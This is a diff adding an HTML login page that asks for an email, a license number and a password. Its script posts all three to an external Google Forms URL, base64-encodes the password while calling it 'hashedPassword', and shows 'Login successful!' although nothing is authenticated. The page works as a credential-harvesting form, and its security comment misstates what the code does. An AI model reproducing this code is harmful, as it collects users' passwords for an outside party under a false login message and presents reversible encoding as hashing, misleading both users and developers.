@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link rel="stylesheet" href="regi2.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>Login Form</h1>
+            <p>Please enter your login details</p>
+        </div>
+        <form id="loginForm" action="https://docs.google.com/forms/d/e/1FAIpQLSfRAmXjeC62-EAVvVgHUTcL06eNQ6bKyr3HVq9_ChOl9r9IGQ/viewform?usp=header" method="POST" target="hidden_iframe">
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="entry.xxxxx" 
+                    required 
+                    placeholder="Enter your email"
+                    pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
+                    title="Please enter a valid email address"
+                >
+            </div>
+            <div class="form-group">
+                <label for="license">License Number</label>
+                <input 
+                    type="text" 
+                    id="license" 
+                    name="entry.xxxxx" 
+                    required 
+                    placeholder="Enter your license number"
+                    pattern="[A-Za-z0-9]+"
+                    title="License number should only contain letters and numbers"
+                >
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="entry.xxxxx" 
+                    required 
+                    placeholder="Enter your password"
+                    minlength="8"
+                >
+                <div class="password-requirements">Password must be at least 8 characters long</div>
+            </div>
+            <div class="form-group">
+                <button type="submit" class="login-button">Login</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Hidden iframe for form submission -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+    <script>
+        // Form validation and submission handling
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const form = this;
+            const email = document.getElementById('email');
+            const license = document.getElementById('license');
+            const password = document.getElementById('password');
+
+            // Validate email format
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            if (!emailRegex.test(email.value)) {
+                alert('Please enter a valid email address');
+                email.focus();
+                return;
+            }
+
+            // Validate license number
+            if (!license.value.match(/^[A-Za-z0-9]+$/)) {
+                alert('License number should only contain letters and numbers');
+                license.focus();
+                return;
+            }
+
+            // Validate password length
+            if (password.value.length < 8) {
+                alert('Password must be at least 8 characters long');
+                password.focus();
+                return;
+            }
+
+            // Create FormData object
+            const formData = new FormData(form);
+            
+            // Basic password encoding (for demonstration - use proper hashing in production)
+            const hashedPassword = btoa(password.value);
+            formData.set('entry.xxxxx', hashedPassword); // Update with actual password field entry ID
+
+            // Submit form data to Google Forms
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            })
+            .then(() => {
+                // Show success message and redirect
+                alert('Login successful!');
+                window.location.href = 'register3.html';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Login failed. Please try again.');
+            });
+        });
+
+        // Real-time password validation
+        document.getElementById('password').addEventListener('input', function() {
+            const requirements = document.querySelector('.password-requirements');
+            requirements.style.color = this.value.length >= 8 ? 'green' : 'red';
+        });
+
+        // Real-time email validation
+        document.getElementById('email').addEventListener('input', function() {
+            this.setCustomValidity('');
+            this.checkValidity();
+        });
+
+        // Real-time license number validation
+        document.getElementById('license').addEventListener('input', function() {
+            this.setCustomValidity('');
+            this.checkValidity();
+        });
+    </script>
+</body>
+</html>
